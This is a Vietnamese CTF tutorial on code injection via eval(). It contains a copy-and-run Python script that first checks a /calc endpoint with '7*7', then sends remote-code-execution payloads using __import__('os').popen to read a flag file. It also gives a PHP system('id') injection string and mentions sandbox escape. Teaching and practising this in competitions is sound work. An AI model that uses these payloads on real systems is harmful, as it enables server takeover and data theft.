# Code Injection qua eval() (web chạy luôn chữ bạn gõ như là code thật)

Một số ngôn ngữ (PHP, Python, Node.js...) có hàm đặc biệt tên `eval()` (hoặc `exec()`): nhận vào 1 CHUỖI CHỮ và CHẠY LUÔN chuỗi đó như là code thật của ngôn ngữ, không kiểm tra gì cả. Lập trình viên hay dùng hàm này cho tiện, ví dụ làm "máy tính công thức" (web nhận `2+2*3`, dùng `eval()` để tính ra `8` mà không cần tự viết bộ phân tích công thức). Nếu web lấy đúng chữ bạn gõ đưa thẳng vào `eval()`, bạn gõ gì thì code đó chạy luôn trên server — giống việc đưa 1 tờ giấy ghi lệnh cho ai đó làm theo y nguyên, không kiểm tra lệnh đó có hại gì không.

Khác với Command Injection (bài trước — chạy lệnh của HỆ ĐIỀU HÀNH) hay SSTI (chạy cú pháp của 1 template engine), ở đây bạn viết thẳng code của chính ngôn ngữ backend (Python, PHP, Node...), không cần "thoát" khỏi cú pháp gì cả vì chuỗi bạn gửi CHÍNH LÀ code được chạy ngay.

Trên Burp bạn nhận ra lỗi này khi: trang có chức năng kiểu "máy tính công thức", "preview biểu thức", "custom filter rule" — gửi `7*7` mà response trả về đúng `49` (không phải chỉ "echo" lại input), tức là có tính toán động thật đằng sau, rất khả nghi dùng `eval()` trực tiếp.

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Bước 1: xác nhận có eval() thật bằng 1 phép toán đơn giản
    r = session.post(f"{base_url}/calc", data={"formula": "7*7"}, timeout=5)
    if "49" not in r.text:
        return None  # không phải eval thật, hoặc endpoint khác -- dừng, không đoán mò

    # Bước 2: thử lần lượt vài payload RCE theo từng ngôn ngữ backend phổ biến
    # __import__('os') -- cách import module os mà KHÔNG CẦN câu lệnh "import" (eval chỉ chạy được biểu thức)
    # popen(...).read() -- chạy lệnh shell, đọc toàn bộ kết quả trả ra
    payloads = [
        "__import__('os').popen('cat flag.txt').read()",      # Python eval()/exec()
        "__import__('os').popen('cat /flag.txt').read()",     # Python, flag ở thư mục gốc
    ]
    for p in payloads:
        r2 = session.post(f"{base_url}/calc", data={"formula": p}, timeout=5)
        m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r2.text)
        if m:
            return m.group(0)
    return None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- Bước 1 là bước "dò" bắt buộc trước khi khai thác sâu: nếu web chỉ hiển thị lại nguyên văn chữ bạn gõ (không tính toán gì), gửi payload RCE sẽ vô nghĩa — luôn kiểm tra `7*7` có ra `49` thật không trước.
- `__import__('os')` là cách gọi hàm `import` mà không cần viết câu lệnh `import os` — vì `eval()` trong Python chỉ chạy được 1 BIỂU THỨC (expression), không chạy được câu LỆNH (statement) như `import`.
- `.popen('cat flag.txt').read()` mở 1 tiến trình con chạy lệnh shell `cat flag.txt`, rồi đọc hết nội dung output của lệnh đó về dưới dạng chuỗi — đây chính là nội dung trả về cho `eval()`, và nếu app echo lại giá trị `eval()` ra response, bạn sẽ thấy nội dung file flag ngay trong `r2.text`.
- Vòng `for` thử lần lượt từng payload trong list `payloads` — hữu ích khi không chắc đường dẫn file flag chính xác là gì, thử vài khả năng hay gặp.

## Lưu ý nhanh

- Nếu response báo lỗi kiểu `NameError: name 'os' is not defined`, app đã chặn `__builtins__` — đây là kỹ thuật "sandbox escape" nâng cao hơn (dùng `().__class__.__base__.__subclasses__()` để tìm lại class có quyền đọc file), không nằm trong snippet rút gọn này.
- Nếu backend là PHP thay vì Python, đổi payload sang cú pháp PHP: `");system('id');//` (đóng câu lệnh gốc, chèn câu lệnh mới, comment phần còn lại).
- Nếu không thấy output nào trong response dù payload đúng, có thể app dùng `exec()` (không trả giá trị) chứ không phải `eval()` — cần kỹ thuật khác để lấy được kết quả ra ngoài, không có trong bài này.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
